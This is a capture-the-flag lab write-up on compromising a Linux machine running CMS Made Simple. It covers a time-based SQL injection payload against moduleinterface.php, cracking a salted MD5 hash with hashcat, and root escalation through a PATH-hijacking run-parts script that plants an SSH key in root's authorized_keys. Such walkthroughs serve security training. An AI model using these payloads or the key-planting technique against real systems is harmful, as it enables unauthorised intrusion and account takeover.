# Writeup
```
Difficulty: Easy
Operating System: Linux
Hints: True
```


### Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :--- | :--- | :--- | :--- |
| 1 | `(unauthenticated)` | **Nmap** & **Directory Enumeration** | Discovered the `/writeup` directory, which was running "CMS Made Simple." The version was identified as 2.2.9.1 from the `CHANGELOG.txt` file. |
| 2 | `(unauthenticated)` | **SQL Injection** | Exploited a time-based SQL injection vulnerability to dump the username (`jkr`), email (`jkr@writeup.htb`), and the salted MD5 password hash. |
| 3 | `jkr` | **Hashcat** & **Password Cracking** | Used Hashcat with the `rockyou.txt` wordlist to crack the salted MD5 hash, revealing the password `raykayjay9`. This password was then used to log in as the user `jkr` via SSH. |
| 4 | `root` | **Path Hijacking** | Identified a writable directory, `/usr/local/bin`, in the user's `PATH`. A custom `run-parts` script was created in this directory to execute a command that added the attacker's public SSH key to the `root` user's `authorized_keys` file. This granted root access via SSH. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Nothing here yet.
| http-robots.txt: 1 disallowed entry
|_/writeup/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see nmap discovers that the operating system in use is Debian 10.  
Since the only obvious path is port 80, let's dig into it.  
As we hit the site, we can see the following statement:
```
########################################################################
#                                                                      #
#           *** NEWS *** NEWS *** NEWS *** NEWS *** NEWS ***           #
#                                                                      #
#   Not yet live and already under attack. I found an   ,~~--~~-.      #
#   Eeyore DoS protection script that is in place and   +      | |\    #
#   watches for Apache 40x errors and bans bad IPs.     || |~ |`,/-\   #
#   Hope you do not get hit by false-positive drops!    *\_) \_) `-'   #
#                                                                      #
#   If you know where to download the proper Donkey DoS protection     #
#   please let me know via mail to jkr@writeup.htb - thanks!           #
#                                                                      #
########################################################################
```
So, we can assume that we cannot run any directory enumeration tool.  
However nmap comes in help, since it seems that it found a robots.txt file and a /writeup directory.  
The robots.txt contains an entry for /writeup directory.  
If we dig into /writeup folder, we can see using wappalizer that this site is running "CMS Made Simple".  
Before searching for exploits for this service, let's enumerate the version.  
At this scope let's [look at the code](http://viewsvn.cmsmadesimple.org/listing.php?repname=cmsmadesimple&path=%2Fbranches%2F1.9.x%2Fdoc%2F&#aa55b71599f8ef8b871f330633f8b860e) of CMS made simple and we can discovered that a file under doc/CHANGELOG.txt is disclosing software version.  
Retrieving this file disclose: ```Version 2.2.9.1``` so we can now look for exploits for this version.  
```
[root@kali Writeup ]$ searchsploit cms made simple        
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                                                                                                                                    | php/webapps/26298.txt
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                                                                                                                                    | php/webapps/26217.html
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                                                                                                                                 | php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                                                                                                                     | php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                    | php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                                                                                                                          | php/webapps/43889.txt
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                                                                                                                            | php/webapps/39760.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                                                                                       | php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                                                                                                                           | php/webapps/5600.php
CMS Made Simple 1.2 - Remote Code Execution                                                                                                                                                                | php/webapps/4442.txt
CMS Made Simple 1.4.1 - Local File Inclusion                                                                                                                                                               | php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                                                                                                                              | php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                                                                                                                                        | php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                                                                                                                           | php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                                                                                                                           | php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                                                                                                                              | php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                                                                                                                                    | php/webapps/34068.html
CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection                                                                                                                             | php/webapps/48944.py
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                                                                                                                           | php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                                                                                                                              | php/webapps/44192.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                   | php/webapps/46635.py
CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                                                                                             | php/webapps/48779.py
CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                                                                                               | php/webapps/48742.txt
CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                                                                                                   | php/webapps/48851.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                                                                                               | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                                                                                                   | php/webapps/49199.txt
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                                                                                                | php/webapps/49793.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                                                                                              | php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                                                                                              | php/webapps/45793.py
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                                                         | php/remote/46627.rb
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                                                                                                                           | php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                                                                                                      | php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                                                                                                             | php/webapps/46546.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
As we can notice, there is an exploit ```CMS Made Simple < 2.2.10 - SQL Injection php/webapps/46635.py``` that seems to match the version we are using, so let's try it.  
This is using an inferential sql injection vulnerability so basically it is guessing char by char all the characters of the hash:
```
[root@kali exploits ]$ python3 46635.py -u http://10.10.10.138/writeup/
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```
Before start cracking the password, since we are curious, let's dig into this exploit.  
First let's set a proxy by changing this:  
```
r = session.get(url)
```
into
```
proxies = {'http': 'http://127.0.0.1:8080'}
s = requests.session()
s.proxies.update(proxies)
r = s.get(url)
```
Now all the requests will be sent to burp, let's capture a successful request an analyse it.
```
GET /writeup/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(5)+from+cms_siteprefs+where+sitepref_value+like+0x3525+and+sitepref_name+like+0x736974656d61736b)+--+ HTTP/1.1
Host: 10.10.10.138
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
as we can see there is a quite scary sql statement. Basically, what is doing, is enumerating with a hex char at a time the hash value contained in the database.  
If the evaluation result true, the select will sleep 1 second, otherwise the select won't sleep.  
In this way we can enumerate the hash by analyzing response times:  
```
if elapsed_time >= TIME: #TIME is the value inside the sleep statement
    flag = True
    break
```
## User
now that we have the hash we can crack it.  
Since this is 32 char, we can assume that this is md5, but since the exploit enumerates also the salt, this means that we have a salted md5.  
First we need to understand how the salt is combined with the password.  
Analyzing the exploit code (since it has a password cracking feature), we can see that the password is combined with the salt in the following manner:  
```
for line in dict.readlines():
      line = line.replace("\n", "")
      beautify_print_try(line)
      if hashlib.md5(str(salt) + line).hexdigest() == password:
          output += "\n[+] Password cracked: " + line
          break
```
so the password is hashed in format:
```
md5($salt.$password)
```
Let's see now what is the hashcat mode to crack this kind of hashes.  
```
# | Name                                                | Category                       
======+=====================================================+======================================
900 | MD4                                                 | Raw Hash                                                                                                                                                                     
  0 | MD5                                                 | Raw Hash                       
100 | SHA1                                                | Raw Hash                                 
1300 | SHA2-224                                            | Raw Hash                                 
1400 | SHA2-256                                            | Raw Hash                       
[... SNIP ...]
 20 | md5($salt.$pass)                                    | Raw Hash salted and/or iterated
```
mode 20 seems suitable for this task. let's run --example hashes to see how ve need to format hash.txt file to be given to hashcat for cracking:  
```
[root@kali Writeup ]$ hashcat --example-hashes
Hash mode #20                         
  Name................: md5($salt.$pass)
  Category............: Raw Hash salted and/or iterated
  Slow.Hash...........: No       
  Password.Len.Min....: 0        
  Password.Len.Max....: 256
  Salt.Type...........: Generic
  Salt.Len.Min........: 0  
  Salt.Len.Max........: 256            
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain  
  Example.Hash........: 57ab8499d08c59a7211c77f557bf9425:4247
  Example.Pass........: hashcat       
  Benchmark.Mask......: ?b?b?b?b?b?b?b
```
as we can see in the 'example hash' we need to give the hash to hashcat in the format hash:salt. so, let's craft the following file:  
```
[root@kali Writeup ]$ cat hash.txt                                                                                                    
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
```
now let's run hashcat
```
[root@kali Writeup ]$ hashcat -m 20 hash.txt --wordlist /usr/share/wordlists/rockyou.txt --show
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```
now that we have the password we can try it with all different services (CMS Made Simple and SSH) and we can see that this password will work with the ssh service (using the previously disclosed jkr user):  
```
[root@kali Writeup ]$ ssh $TARGET -l jkr                       
jkr@10.10.10.138's password:
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Feb  7 05:18:14 2022 from 10.10.14.2
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
jkr@writeup:~$
```
## Root
Once we are logged in, following our standard approach, let's run linPEAS.    
After we run linPEAS we can see the following marked as a highly probable privilege escalation vector:
```
╔══════════╣ PATH                                                                                                                                                                                                                            
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                                           
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                                                              
New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin                                                                                                                                  

```
seems like there is one additional entry in the $PATH env variable.  
Since we are in staff group, we can edit this path:
```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
Group staff:                                                                                                        
/var/local                                                                                                            
/usr/local                                                 
/usr/local/bin                                                                                                        
[... SNIP ...]                                                                            
/usr/local/sbin                        
```
So all we have to do now is to look for a process that is running as root with a relative path, and since /usr/local/bin is the first in the $PATH:
```
jkr@writeup:/usr/local/bin$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
If the executable is located somewhere else, we can hijack the execution by creating our program under /usr/local/bin.  
In order to find a program that runs with a relative path we can use pspy64.  
After we wait for a while we can see that no background process is executed, so, let's try to trigger some actions by ourselves.  
If we try to login, we can see that the following process gets executed:  
```
2022/02/07 09:39:41 CMD: UID=0    PID=17016  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2022/02/07 09:39:41 CMD: UID=0    PID=17017  | run-parts --lsbsysinit /etc/update-motd.d
```
As we can see two program gets executed with a relative path: sh and run-parts.  
We cannot hijack sh since during the invocation the PATH variable is not yet being exported with the vulnerable value, so let's try to hijack run-parts.  
```
jkr@writeup:~$ which run-parts
/bin/run-parts
```
as we can see run-parts is located under /bin/, so we can create a /usr/local/bin/run-parts file with the following content:  
```
jkr@writeup:/usr/local/bin$ cat /usr/local/bin/run-parts
#!/bin/bash
mkdir ~/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBKgIj8T1dDsNei5W+chKJq6zsGqRXVUbKAQi2tupjI6HiKo7uCVypn/RKW7aDiyj3TofEZE6C7m/M9lLLFn2HVtMzKvWc+sdRnQ+3jir1txBSWBc+Wh6eBIvLPCRv2LpAIK9GsE3SFV4zLZGEAN8RQxNBTXOtN/bZjzgP/SBKp/bMGUjFWaN9JzrEiAkPqZLnKnGn6IBlGFlrm5CzRSda7J//R297aQskj2LXbZtU/WlbwRw4Fw6mt+9rwkija+stcx/PgDSmUI/7diNgxJpcn8eU0Yq8nTUyU6owgF0Hr+qK0YQfggtGqitjof+pyDF/nAKE52rZ7WPec4I+gQQbWJbxp6NvInyIgq+ISsZSdt/cimfe3yIRhyEaPSKuYskV/frmTqlNp5HL1WYzLn3+UyiSbTpmwKbYbjQljRyHdgGWTZT7ezsB+Qx0KaeLlDSVnWJnWqhFD5vQIBfTcsDvshg/WL8VZ3d7Y/4PbP1CDo0c79jYMZqlex8V5T6pbaU= root@kali' >> ~/.ssh/authorized_keys
```
and now we can login as root using our ssh private key:  
```
[root@kali Writeup ]$ ssh $TARGET -l root

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  6 08:41:28 2021
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
root@writeup:~#
```
